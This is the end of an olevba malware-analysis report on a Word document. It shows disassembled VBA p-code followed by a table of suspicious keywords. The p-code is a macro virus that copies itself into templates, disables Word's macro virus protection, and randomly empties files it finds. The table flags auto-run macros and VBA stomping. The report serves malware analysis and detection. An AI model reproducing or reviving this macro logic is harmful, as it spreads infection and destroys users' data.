' 	ArgsLd Mid$ 0x0003 
' 	St Knam 
' Line #190:
' 	Ld Knam 
' 	LitStr 0x0002 "PC"
' 	Eq 
' 	Ld Knam 
' 	LitStr 0x0002 "Pc"
' 	Eq 
' 	Or 
' 	Ld Knam 
' 	LitStr 0x0002 "pC"
' 	Eq 
' 	Or 
' 	Ld Knam 
' 	LitStr 0x0002 "pc"
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #191:
' 	LitDI2 0x0001 
' 	St KFlag 
' Line #192:
' 	Ld MyPath 
' 	Ld MyName 
' 	Concat 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	St MyPass 
' Line #193:
' 	LitDI2 0x0000 
' 	St Stcnt 
' Line #194:
' 	Ld WR0005 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #195:
' 	Ld WR0006 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #196:
' 	Ld MyPass 
' 	Paren 
' 	ArgsCall BRiBAGI 0x0001 
' Line #197:
' 	Label hanako1 
' Line #198:
' 	LitDI2 0x0000 
' 	St i1 
' Line #199:
' 	Ld WR0005 
' 	LitDI2 0x0002 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #200:
' 	LitDI2 0x0002 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #201:
' 	LitDI2 0x0002 
' 	Sharp 
' 	Input 
' 	Ld dummy 
' 	InputItem 
' 	InputDone 
' Line #202:
' 	Ld i1 
' 	LitDI2 0x0001 
' 	Add 
' 	St i1 
' Line #203:
' 	Ld dummy 
' 	Ld i1 
' 	ArgsSt a 0x0001 
' Line #204:
' 	Loop 
' Line #205:
' 	LitDI2 0x0002 
' 	Sharp 
' 	Close 0x0001 
' Line #206:
' 	Ld Stcnt 
' 	Ld i1 
' 	Ne 
' 	IfBlock 
' Line #207:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	Ld Stcnt 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld i1 
' 	For 
' Line #208:
' 	Ld j 
' 	ArgsLd a 0x0001 
' 	Paren 
' 	ArgsCall BRiBAGI 0x0001 
' Line #209:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #210:
' 	Ld i1 
' 	St Stcnt 
' 	BoS 0x0000 
' 	GoTo hanako1 
' Line #211:
' 	EndIfBlock 
' Line #212:
' 	EndIfBlock 
' Line #213:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #214:
' 	EndIfBlock 
' Line #215:
' 	EndIfBlock 
' Line #216:
' 	EndIfBlock 
' Line #217:
' 	Ld KFlag 
' 	LitDI2 0x0001 
' 	Ne 
' 	IfBlock 
' Line #218:
' 	Ld Dir 
' 	St MyName 
' Line #219:
' 	ElseBlock 
' Line #220:
' 	ExitDo 
' Line #221:
' 	EndIfBlock 
' Line #222:
' 	Loop 
' Line #223:
' 	Ld KFlag 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #224:
' 	ArgsCall Read 0x0000 
' Line #225:
' 	Ld WR0006 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #226:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #227:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Input 
' 	Ld fnam 
' 	InputItem 
' 	InputDone 
' Line #228:
' 	Ld Rnd 
' 	LitDI2 0x0002 
' 	Mul 
' 	FnInt 
' 	St FFlag 
' Line #229:
' 	Ld FFlag 
' 	If 
' 	BoSImplicit 
' 	Ld fnam 
' 	LitDI2 0x0002 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' 	BoS 0x0000 
' 	LitDI2 0x0002 
' 	Sharp 
' 	Close 0x0001 
' 	EndIf 
' Line #230:
' 	Loop 
' Line #231:
' 	EndIfBlock 
' Line #232:
' Line #233:
' 	LineCont 0x0004 0A 00 08 00
' 	Ld False$ 
' 	ParamNamed Source 
' 	Ld N$ 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "Personal"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #234:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd AttachedTemplate 
' 	Set MyTemplate 
' Line #235:
' 	Ld MyTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #236:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0002 
' 	ArgsLd LBound$ 0x0002 
' 	LitStr 0x0004 "•¶�‘"
' 	Ne 
' 	IfBlock 
' Line #237:
' 	LineCont 0x0004 0A 00 08 00
' 	Ld N$ 
' 	ParamNamed Source 
' 	Ld False$ 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "Personal"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #238:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #239:
' 	EndIfBlock 
' Line #240:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #241:
' 	EndSub 
' Line #242:
' Line #243:
' 	FuncDefn (Sub DOpen())
' Line #244:
' 	Ld ActiveDocument 
' 	MemLd Path 
' 	St False$ 
' Line #245:
' 	Ld False$ 
' 	LitDI2 0x0001 
' 	ArgsLd Right$ 0x0002 
' 	LitStr 0x0001 "\"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld False$ 
' 	LitDI2 0x0002 
' 	ArgsLd LBound$ 0x0002 
' 	St False$ 
' 	EndIf 
' Line #246:
' 	Ld False$ 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Concat 
' 	St False$ 
' Line #247:
' 	Ld ActiveDocument 
' 	MemLd AttachedTemplate 
' 	MemLd Path 
' 	St N$ 
' Line #248:
' 	Ld N$ 
' 	LitDI2 0x0001 
' 	ArgsLd Right$ 0x0002 
' 	LitStr 0x0001 "\"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld N$ 
' 	LitDI2 0x0002 
' 	ArgsLd LBound$ 0x0002 
' 	St N$ 
' 	EndIf 
' Line #249:
' 	Ld N$ 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	Ld ActiveDocument 
' 	MemLd AttachedTemplate 
' 	MemLd New 
' 	Concat 
' 	St N$ 
' Line #250:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #251:
' 	LineCont 0x0004 06 00 08 00
' 	Ld False$ 
' 	ParamNamed Source 
' 	LitStr 0x0008 "Personal"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #252:
' 	EndSub 
' Line #253:
' Line #254:
' 	FuncDefn (Sub DWri())
' Line #255:
' 	LitR8 0x5C29 0xC28F 0x28F5 0x3FF0 
' 	St DVsn 
' Line #256:
' 	Ld ActiveDocument 
' 	MemLd AttachedTemplate 
' 	MemLd Path 
' 	St N$ 
' Line #257:
' 	Ld N$ 
' 	LitDI2 0x0001 
' 	ArgsLd Right$ 0x0002 
' 	LitStr 0x0001 "\"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld N$ 
' 	LitDI2 0x0002 
' 	ArgsLd LBound$ 0x0002 
' 	St N$ 
' 	EndIf 
' Line #258:
' 	Ld N$ 
' 	LitStr 0x000B "\WR0001.txt"
' 	Concat 
' 	St N1$ 
' Line #259:
' 	Ld N$ 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	Ld ActiveDocument 
' 	MemLd AttachedTemplate 
' 	MemLd New 
' 	Concat 
' 	St N$ 
' Line #260:
' 	Ld N1$ 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #261:
' 	LitDI2 0x0001 
' 	Sharp 
' 	WriteChan 
' 	Ld DVsn 
' 	PrintItemNL 
' Line #262:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #263:
' 	EndSub 
' Line #264:
' Line #265:
' 	FuncDefn (Sub AutoExit())
' Line #266:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #267:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

